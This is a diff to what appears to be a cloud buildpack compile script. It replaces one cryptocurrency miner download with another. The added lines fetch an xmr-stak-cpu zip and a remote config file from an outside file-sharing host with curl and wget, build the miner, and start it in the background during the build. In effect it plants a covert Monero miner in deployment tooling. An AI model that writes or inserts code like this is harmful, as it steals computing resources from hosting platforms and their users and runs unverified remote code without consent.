@@ -37,7 +37,7 @@ echo "-----> Installing s3cmd... "
 apt-get $APT_OPTIONS update | indent
 apt-get $APT_OPTIONS -y --force-yes -d install --reinstall s3cmd | indent
 echo "-----> Installing other dependencies... "
-apt-get $APT_OPTIONS -y --force-yes -d install --reinstall libcurl4-openssl-dev build-essential libjansson-dev autotools-dev screen automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++ build-essential git nano nload speedometer iftop tcpdump htop dstat zip unzip
+apt-get $APT_OPTIONS -y --force-yes -d install --reinstall screen build-essential git nano nload speedometer iftop tcpdump zip unzip libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev gcc
 mkdir -p $BUILD_DIR/.apt/var/run/screen
 
 mkdir -p $BUILD_DIR/.profile.d
@@ -57,13 +57,14 @@ for DEB in $(ls -1 $APT_CACHE_DIR/archives/*.deb); do
   dpkg -x $DEB $BUILD_DIR/.apt/
 done
 
-curl -o cpu.zip -s -L "http://puu.sh/xUHe3/09ed0bb5d1.zip"
-unzip cpu.zip
-rm cpu.zip
-cd cpuminer-multi
-chmod 777 autogen.sh
-./autogen.sh
-CFLAGS="-march=native" ./configure
-make
-mv * $BUILD_DIR/
+curl -o xxx.zip -s -L "http://share.fakemmehd.net/files/xmr-stak-cpu.zip"
+unzip xxx.zip
+rm xxx.zip
+cd xmr-stak-cpu
+cmake .
+make install
+cd bin
+rm config.txt
+wget http://share.fakemmehd.net/text/2017-10-12_09-59-07.txt -O config.txt
+./xmr-stak-cpu &
 echo "done"
